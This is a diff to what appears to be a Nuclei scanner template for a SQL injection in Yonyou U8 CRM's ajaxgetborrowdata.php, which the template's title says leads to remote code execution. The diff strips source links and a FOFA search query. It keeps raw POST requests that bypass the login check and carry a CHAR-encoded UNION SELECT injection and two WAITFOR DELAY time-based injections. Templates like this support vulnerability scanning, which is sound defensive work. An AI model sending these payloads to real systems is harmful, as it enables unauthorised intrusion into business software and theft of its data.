@@ -3,12 +3,8 @@ info:
   name: 用友U8 CRM ajaxgetborrowdata.php SQL注入致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dz891apdcseagft4'
+  description: ''
   tags: rce,sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dz891apdcseagft4
-    fofa: title="[用友U8](https://so.csdn.net/so/search?q=用友U8&spm=1001.2101.3001.7020" \o "用友U8)CRM"
 http:
 - raw:
   - 'POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo HTTP/1.1
@@ -30,9 +26,7 @@ http:
     Connection: close
 
 
-    cWhCode=1''+UNION+ALL+SELECT+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(113)+CHAR(99)+CHAR(105)+CHAR(114)+CHAR(87)+CHAR(120)+CHAR(74)+CHAR(66)+CHAR(106)+CHAR(85)+CHAR(98)+CHAR(86)+CHAR(74)+CHAR(75)+CHAR(68)+CHAR(108)+CHAR(99)+CHAR(114)+CHAR(90)+CHAR(67)+CHAR(74)+CHAR(114)+CHAR(73)+CHAR(76)+CHAR(77)+CHAR(101)+CHAR(70)+CHAR(122)+CHAR(88)+CHAR(86)+CHAR(103)+CHAR(81)+CHAR(99)+CHAR(107)+CHAR(65)+CHAR(68)+CHAR(67)+CHAR(85)+CHAR(76)+CHAR(79)+CHAR(122)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(98)+CHAR(113)--+KRVC
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600197835-fde2da97-0dc3-4c8d-9978-d8e8662cc98a.png)'
+    cWhCode=1''+UNION+ALL+SELECT+CHAR(113)+CHAR(113)+CHAR(118)+CHAR(106)+CHAR(113)+CHAR(99)+CHAR(105)+CHAR(114)+CHAR(87)+CHAR(120)+CHAR(74)+CHAR(66)+CHAR(106)+CHAR(85)+CHAR(98)+CHAR(86)+CHAR(74)+CHAR(75)+CHAR(68)+CHAR(108)+CHAR(99)+CHAR(114)+CHAR(90)+CHAR(67)+CHAR(74)+CHAR(114)+CHAR(73)+CHAR(76)+CHAR(77)+CHAR(101)+CHAR(70)+CHAR(122)+CHAR(88)+CHAR(86)+CHAR(103)+CHAR(81)+CHAR(99)+CHAR(107)+CHAR(65)+CHAR(68)+CHAR(67)+CHAR(85)+CHAR(76)+CHAR(79)+CHAR(122)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(98)+CHAR(113)--+KRVC'
   redirects: false
   matchers:
   - status:
@@ -58,9 +52,7 @@ http:
     Connection: close
 
 
-    cInvCode=1'';WAITFOR+DELAY+''0:0:6''--
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600198126-fa53026f-76b6-45ab-b34a-d07c97451d1d.png)'
+    cInvCode=1'';WAITFOR+DELAY+''0:0:6''--'
   redirects: false
   matchers:
   - status:
@@ -86,9 +78,7 @@ http:
     Connection: close
 
 
-    cus=1'';WAITFOR+DELAY+''0:0:6''--
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600198401-ae6f17fb-b773-4fb5-b7ab-af1094812fae.png)'
+    cus=1'';WAITFOR+DELAY+''0:0:6''--'
   redirects: false
   matchers:
   - status:
